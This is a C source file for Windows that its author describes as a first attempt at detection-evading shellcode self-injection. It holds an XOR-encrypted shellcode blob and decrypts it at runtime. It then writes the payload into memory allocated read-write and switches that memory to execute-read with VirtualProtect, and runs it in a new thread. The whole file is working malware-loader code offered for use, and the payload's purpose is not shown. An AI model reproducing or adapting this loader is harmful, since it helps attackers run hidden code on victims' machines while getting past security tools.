#include <windows.h>
#include <stdio.h>
#include <stdint.h>

/*Here is the Firt attempt on self_injectionv0.c to evade detection. I will encrypt the
hardcoded shellcode which is goint to get decrypted at runtime another change is the
memory allocation strategy. Now i going to allocate RW, then write the shellcode and make
the use VirtualProtect api to change the rigths to RX to run the thread. 
*/  
unsigned char encrypted_shellcode[] = 
"\xb7\xa3\xc9\x4b\x4b\x4b\x2b\xc2\xae\x7a\x8b\x2f\xc0\x1b"
"\x7b\xc0\x19\x47\xc0\x19\x5f\xc0\x39\x63\x44\xfc\x01\x6d"
"\x7a\xb4\xe7\x77\x2a\x37\x49\x67\x6b\x8a\x84\x46\x4a\x8c"
"\xa9\xb9\x19\x1c\xc0\x19\x5b\xc0\x01\x77\xc0\x07\x5a\x33"
"\xa8\x03\x4a\x9a\x1a\xc0\x12\x6b\x4a\x98\xc0\x02\x53\xa8"
"\x71\x02\xc0\x7f\xc0\x4a\x9d\x7a\xb4\xe7\x8a\x84\x46\x4a"
"\x8c\x73\xab\x3e\xbd\x48\x36\xb3\x70\x36\x6f\x3e\xaf\x13"
"\xc0\x13\x6f\x4a\x98\x2d\xc0\x47\x00\xc0\x13\x57\x4a\x98"
"\xc0\x4f\xc0\x4a\x9b\xc2\x0f\x6f\x6f\x10\x10\x2a\x12\x11"
"\x1a\xb4\xab\x14\x14\x11\xc0\x59\xa0\xc6\x16\x23\x78\x79"
"\x4b\x4b\x23\x3c\x38\x79\x14\x1f\x23\x07\x3c\x6d\x4c\xb4"
"\x9e\xf3\xdb\x4a\x4b\x4b\x62\x8f\x1f\x1b\x23\x62\xcb\x20"
"\x4b\xb4\x9e\x1b\x1b\x1b\x1b\x0b\x1b\x0b\x1b\x23\xa1\x44"
"\x94\xab\xb4\x9e\xdc\x21\x4e\x23\x8b\xe3\x7f\xcb\x23\x49"
"\x4b\x6c\x44\xc2\xad\x21\x5b\x1d\x1c\x23\xd2\xee\x3f\x2a"
"\xb4\x9e\xce\x8b\x3f\x47\xb4\x05\x43\x3e\xa7\x23\xbb\xfe"
"\xe9\x1d\xb4\x9e\x23\x28\x26\x2f\x4b\xc2\xa8\x1c\x1c\x1c"
"\x7a\xbd\x21\x59\x12\x1d\xa9\xb6\x2d\x8c\x0f\x6f\x77\x4a"
"\x4a\xc6\x0f\x6f\x5b\x8d\x4b\x0f\x1f\x1b\x1d\x1d\x1d\x0d"
"\x1d\x05\x1d\x1d\x18\x1d\x23\x32\x87\x74\xcd\xb4\x9e\xc2"
"\xab\x05\x1d\x0d\xb4\x7b\x23\x43\xcc\x56\x2b\xb4\x9e\xf0"
"\xbb\xfe\xe9\x1d\x23\xed\xde\xf6\xd6\xb4\x9e\x77\x4d\x37"
"\x41\xcb\xb0\xab\x3e\x4e\xf0\x0c\x58\x39\x24\x21\x4b\x18"
"\xb4\x9e";
unsigned char shellcode[325];

int main(){
    //Decrypt the shellcode
    int shellcodeSize = sizeof(encrypted_shellcode);
    char key = 'K';
    for(int i = 0; i<shellcodeSize-1; i++){
        shellcode[i] = encrypted_shellcode[i]^key;
    }
    /*
    LPVOID VirtualAlloc(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );  */
    LPVOID mem_allocated = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (mem_allocated == NULL){
        printf("[-]failed, error: %ld", GetLastError());
        return 1;
    }
    /*
    void RtlCopyMemory(
    void*       Destination,
    const void* Source,
    size_t      shellcodeSize
    ); */
    RtlCopyMemory(mem_allocated, shellcode, sizeof(shellcode));

    /*
    BOOL VirtualProtect(
    [in]  LPVOID lpAddress,
    [in]  SIZE_T dwSize,
    [in]  DWORD  flNewProtect,
    [out] PDWORD lpflOldProtect
    ); */
    DWORD out;
    BOOL status = VirtualProtect(mem_allocated, sizeof(shellcode), PAGE_EXECUTE_READ, &out);
    if (status != 0){
        /*
        HANDLE CreateThread(
            [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
            [in]            SIZE_T                  dwStackSize,
            [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
            [in, optional]  __drv_aliasesMem LPVOID lpParameter,
            [in]            DWORD                   dwCreationFlags,
            [out, optional] LPDWORD                 lpThreadId
            );
        */
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem_allocated, NULL, 0, NULL);

    if (hThread == NULL){
        DWORD dwError = GetLastError();
        printf("hTheard failed to create: %lu\n",dwError);
        return 1;
    }
    //Now hold the execution to make sure that the thread finishes execution
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(mem_allocated, 0, MEM_RELEASE);
}
    else{
        printf("[-]failed to set mem protection to, error: %ld", GetLastError());
    }

    return 0;
}